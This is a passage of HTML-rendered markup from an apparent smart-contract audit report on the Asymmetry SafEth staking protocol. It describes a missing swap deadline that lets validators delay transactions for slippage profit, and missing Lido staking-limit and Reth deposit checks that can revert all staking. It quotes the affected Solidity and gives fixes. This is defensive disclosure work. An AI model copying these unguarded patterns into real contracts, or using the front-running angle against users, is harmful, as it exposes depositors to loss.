class=\"grvsc-source\">        tokenIn: _tokenIn,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokenOut: _tokenOut,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        fee: _poolFee,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        recipient: address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        amountIn: _amountIn,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        amountOutMinimum: _minOut,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        sqrtPriceLimitX96: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102</a></p>\n<p>The following scenario can happen:</p>\n<ol>\n<li>User is staking and some/all the weight is in Reth.</li>\n<li>The pool can’t deposit eth, so uniswap will be used to convert eth to weth.</li>\n<li>A validator holds the tx until it becomes advantageous due to some market condition (e.g. slippage or running his tx before and frontrun the original user stake).</li>\n<li>This could potentially happen to a large amount of stakes, due to widespread usage of bots and MEV.</li>\n</ol>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Because Front-running is a key aspect of AMM design, deadline is a useful tool to ensure that your tx cannot be “saved for later”.</p>\n<p>Due to the removal of the check, it may be more profitable for a validator to deny the transaction from being added until the transaction incurs the maximum amount of slippage.</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>Reth.deposit()</code> function should accept a user-input <code>deadline</code> param that should be passed along to Reth.swapExactInputSingleHop() and ISwapRouter.exactInputSingle().</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Using swapTo/swapFrom directly from rocketpool.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Not mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/36\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/45\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/16\">0x52</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h2 id=\"m-05-missing-derivative-limit-and-deposit-availability-checks-will-revert-the-whole-stake-function\" style=\"position:relative;\"><a href=\"#m-05-missing-derivative-limit-and-deposit-availability-checks-will-revert-the-whole-stake-function\" aria-label=\"m 05 missing derivative limit and deposit availability checks will revert the whole stake function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812\">[M-05] Missing derivative limit and deposit availability checks will revert the whole <code>stake()</code> function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812\">silviaxyz</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1152\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1050\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/994\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/763\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/702\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/662\">0xMirce</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/622\">Tricko</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/592\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/550\">Franfran</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/544\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/520\">shaka</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/458\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/342\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/296\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/225\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/100\">codeislight</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/27\">volodya</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L73-L81\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L73-L81</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L156-L204\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L156-L204</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L120-L150\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L120-L150</a></p>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The users will not be able to stake their funds and there will be loss of reputation</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>SafEth</code> contract’s <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63\"><code>stake()</code></a> function is the main entry point to add liquid Eth to the derivatives. Accordingly the <code>stake()</code> function takes the users’ ETH and convert it into various derivatives based on their weights and mint an amount of safETH that represents a percentage of the total assets in the system.</p>\n<p>The execution to deposit to the available derivative is done through iterating the derivatives mapping in <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEthStorage.sol#L22\"><code>SafEthStorage</code></a> contract.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pauseStaking</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;staking is paused&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">minAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;amount too low&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;amount too high&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Getting underlying value in terms of ETH for each derivative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Price of safETH in regards to ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// initializes with a price of 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// total amount of derivatives worth of ETH in system</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">weights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IDerivative</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// This is slightly less than ethAmount because slippage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">depositAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) * </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// mintAmount represents a percentage of the total assets in the system</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Staked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>And for all the derivatives the stake function calls the derivative contract’s <code>deposit()</code> function. Below is for <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L73-L81\"><code>WstEth</code></a> contract’s <code>deposit()</code> function to adapt to Lido staking;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wstEthBalancePre</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// solhint-disable-next-line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to send Ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wstEthBalancePost</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wstEthAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">wstEthBalancePost</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">wstEthBalancePre</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">wstEthAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The Lido protocol implements a daily staking limit both for <code>stETH</code> and <code>WstETH</code> as per their <a href=\"https://docs.lido.fi/guides/steth-integration-guide/#staking-rate-limits\">docs</a>\nAccordingly the daily rate is 150000 ETH and the <code>deposit()</code> function will revert if the limit is hit. From the docs:</p>\n<blockquote>\n<p><strong><em>Staking rate limits</em></strong>\nIn order to handle the staking surge in case of some unforeseen market conditions, the Lido protocol implemented staking rate limits aimed at reducing the surge’s impact on the staking queue &#x26; Lido’s socialized rewards distribution model. There is a sliding window limit that is parametrized with _maxStakingLimit and _stakeLimitIncreasePerBlock. This means it is only possible to submit this much ether to the Lido staking contracts within a 24 hours timeframe. Currently, the daily staking limit is set at <strong><em>150,000 ether</em></strong>.\nYou can picture this as a health globe from Diablo 2 with a maximum of _maxStakingLimit and regenerating with a constant speed per block. When you deposit ether to the protocol, the level of health is reduced by its amount and the current limit becomes smaller and smaller. <strong><em>When it hits the ground, transaction gets reverted.</em></strong>\nTo avoid that, you should check if <code>getCurrentStakeLimit() >= amountToStake</code>, and if it’s not you can go with an alternative route. The staking rate limits are denominated in ether, thus, it makes no difference if the stake is being deposited for stETH or using the wstETH shortcut, the limits apply in both cases.</p>\n</blockquote>\n<p>However this check was not done either in <code>SafEth::stake()</code> or <code>WstEth::deposit()</code> functions. So if the function reverts, the stake function will all revert and it will not be possible to deposit to the other derivatives as well.</p>\n<p><strong>Another issue lies in the Reth contract having the same root cause below - Missing Validation &#x26; external tx dependency.</strong></p>\n<p>For all the derivatives the stake function calls the derivative contract’s <code>deposit()</code> function. Below is <code>rETH</code> contract’s <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L156-L204\"><code>deposit()</code></a> function;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Per RocketPool Docs query addresses each time it is used</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 